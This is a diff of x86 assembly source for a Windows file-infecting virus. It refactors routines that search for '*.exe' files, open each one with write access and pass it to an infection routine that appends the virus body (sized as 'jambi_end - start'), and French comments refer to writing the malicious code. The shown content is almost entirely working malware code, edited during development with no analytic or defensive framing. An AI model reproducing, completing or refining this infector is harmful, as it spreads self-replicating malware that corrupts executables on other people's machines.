@@ -86,8 +86,15 @@ deltaoffset:
     ; et passe a la suite
     ; sinon, writefile le code malveillant
 
+
+
+
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+; Find first file to infect
+; following filter '*.exe', exit_fail if none is found
+; no param
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
 find_first:
-    ; find first .exe file - filter: *.exe - exit_fail if none is found
 
     mov     eax, ebp ; EBP -> real address of delta offset
     add     eax, offset FindFirstFile_b
@@ -137,6 +144,14 @@ find_first:
     ; infect found .exe file
     call    infect_file
 
+
+
+
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+; Find next file(s) to infect
+; following filter '*.exe', exit_fail if none is found
+; no param
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
 find_next:
     ;find next .exe file, if exists
 
@@ -483,6 +498,7 @@ strcmp_done:
 infect_file:
     ; infect found .exe file
 
+    ; save pointer to WIN32_FIND_DATAA
     push    edx
 
     xor     eax, eax
@@ -496,15 +512,10 @@ infect_file:
     push    esi ; DOS header
     call    ent_get_function_addr
 
+    ; restore pointer to WIN32_FIND_DATAA
     pop     edx
-    ; open file
-    ;push    00h
-    ;push    00h
-    ;push    03h
-    ;push    00h
-    ;push    01h
-    ;push    0C0000000h
 
+    ; open file
     push    00h ; no template handle
     push    80h ; flag FILE_ATTRIBUTE_NORMAL
     push    03h ; flag OPEN_EXISTING
@@ -580,7 +591,7 @@ _data:
    find_data ends
 
    ;win32_find_data find_data <?>
-   ;win32_find_data WIN32_FIND_DATAA <?>
+   ;win32_find_data WIN32_FIND_DATA <0>
    ;FileHandleFind  dd ?
    filter          db "*.exe",0
    virusSize       equ jambi_end - start
